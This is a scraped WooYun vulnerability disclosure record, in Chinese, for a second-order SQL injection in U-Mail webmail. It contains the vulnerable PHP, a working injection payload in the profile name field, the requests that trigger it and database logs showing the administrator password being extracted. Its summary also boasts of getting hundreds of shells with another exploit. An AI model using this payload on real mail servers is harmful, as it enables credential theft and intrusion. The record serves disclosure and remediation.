{"id": 44514, "wybug_id": "wooyun-2015-093376", "wybug_title": "U-Mail邮件系统二次注入（不鸡肋，可直接获取管理员密码）", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-22 23:02", "wybug_open_date": "2015-04-22 23:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向公众公开  简要描述： U-Mail别哭。另外wooyun-2010-093049更新了无需登录且可批量getshell的exp，随便测试了下，批量轻轻松松get几百个shell，很严重，望管理速审核 :) 详细说明：  漏洞文件/client/oabshare/module/operates.php 代码\nif ( ACTION == \"save-to-pab\" ){\t\tinclude_once( LIB_PATH.\"PAB.php\" );\t\t$PAB = PAB::getinstance( );\t\t$maillist_id = gss( $_GET['maillist'] );\t\t$maillist_id = intval( $maillist_id );\t\tif ( $maillist_id )\t\t{\t\t\t\t......\t\t}\t\telse\t\t{\t\t\t\t$domain_id = gss( $_GET['domain_id'] );\t\t\t\t$user_ids = gss( $_GET['userlist'] );\t\t\t\t$user_ids = id_list_filter( $user_ids );//WooYun-2014-74928\t\t\t\tif ( !$user_ids )\t\t\t\t{\t\t\t\t\t\tdump_msg( \"param_error\", \"参数错误！\" );\t\t\t\t}\t\t\t\t$where = \"t1.UserID IN (\".$user_ids.\")\";\t\t\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, \"\", \"\", \"\", \"\", 0 );//首先是从数据库获取数据\t\t\t\t$user_all = $arr_tmp['data'];\t\t\t\tif ( !$user_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\t\t\t\tforeach ( $user_all as $user )\t\t\t\t{\t\t\t\t\t\t$qq = $msn = \"\";\t\t\t\t\t\tif ( strpos( $user['qqmsn'], \"@\" ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$msn = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$qq = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\tif ( !$PAB->getContactByMail( $user_id, $user['email'], \"contact_id\", 0 ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user['FullName'],//从数据库读取的字段内容\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user['email'],\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user['teleextension'] ? $user['teleextension'] : $user['mobil'],\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user['birthday'],\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $qq,\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $msn,\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$res = $PAB->add_contact( $data, 0 );//直接将读取的内容执行了add的操作\t\t\t\t\t\t\t\tif ( !$res )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdump_json( array( \"status\" => FALSE, \"message\" => \"添加联系人时发生错误，添加失败！\" ) );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );}\n首先，需要引入二次注入的exp，引入文件如下/client/option/module/o_userinfo.php\nif ( ACTION == \"userinfo\" ){\t\t$url = make_link( \"option\", \"view\", \"userinfo\" );\t\t$where = \"UserID='\".$user_id.\"'\";\t\t$data = array(\t\t\t\t\"FullName\" => gss( $_POST['fullname'] ),//获得的数据存入数据库\t\t\t\t\"EnglishName\" => gss( $_POST['englishname'] )\t\t);\t\t$result = $Mailbox->update_mailbox( $data, $where, 0 );\t\tif ( !$result )\t\t{\t\t\t\tredirect( $url, \"修改姓名时出现错误，修改失败！\" );\t\t}\n将单引号等信息存入数据库，查看表结构，如下\n\n长度为100足够读取敏感数据了首先登录用户，在修改个人资料处，中文名处填写',`homepage`=(SELECT password from userlist where userid=2)#如图\n\n保存后，查看自己用户的userid，请求为http://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get&page=1&orderby=&is_reverse=1&keyword=test0006如图\n\n然后执行如下请求http://mail.fuck.com/webmail/client/oabshare/index.php?module=operate&action=save-to-pab&domain_id=1&userlist=9userlist为自己的userid，domain_id默认都为1执行完毕后，点击个人通讯录，如图\n\n空白处，system帐号的密码如图\n\n\n\n两步的sql执行情况如下\n150122 15:54:44\t 2665 Connect\tumail@localhost on \t\t 2665 Query\tSET NAMES 'UTF8'\t\t 2665 Init DB\tumail\t\t 2665 Query\tUPDATE userlist SET `FullName`='\\',`homepage`=(SELECT password from userlist where userid=2)#',`EnglishName`='' WHERE UserID='9'\t\t 2665 Query\tUPDATE mailuserinfo SET `sex`='0',`birthday`='0000-00-00',`mobil`='',`teleextension`='',`extnum`='',`qqmsn`='',`worknum`='',`memo`='',`o_group`='' WHERE UserID='9'\t\t 2665 Quit\n以及\n150122 15:57:16\t 2668 Connect\tumail@localhost on \t\t 2668 Query\tSET NAMES 'UTF8'\t\t 2668 Init DB\tumail\t\t 2668 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (8)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2668 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (8)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2668 Query\tSELECT contact_id FROM pab_contact WHERE user_id='9' AND pref_email='test0005@fuck.com' LIMIT 1\t\t 2668 Query\tINSERT INTO pab_contact SET `user_id`='9',`fullname`='',`homepage`=(SELECT password from userlist where userid=2)#',`pref_email`='test0005@fuck.com',`pref_tel`='',`birthday`='0000-00-00',`im_qq`='',`im_msn`='',`updated`='2015-01-22 15:57:16'\t\t 2668 Quit\n   漏洞证明：  如上   修复方案：  出库后，继续入库前也要进行相应的转义等处理   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-01-27 11:12 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-23 10:35 |    \t\tcnssr4bb1t \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 优美。)\t\t \n  人家好像不太愿意搭理你了    \n     2015-01-23 11:25 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @cnssr4bb1t 估计不爱了。。    \n     2015-01-23 11:33 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  你妹，哥的二次注入就是小厂商    \n     2015-01-23 11:56 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @menmen519 不是，你的二次注入我看了的，你那个字段长度是20，也就能引入user()好像，应该还获取不到密码等信息，你测测看看是不是    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}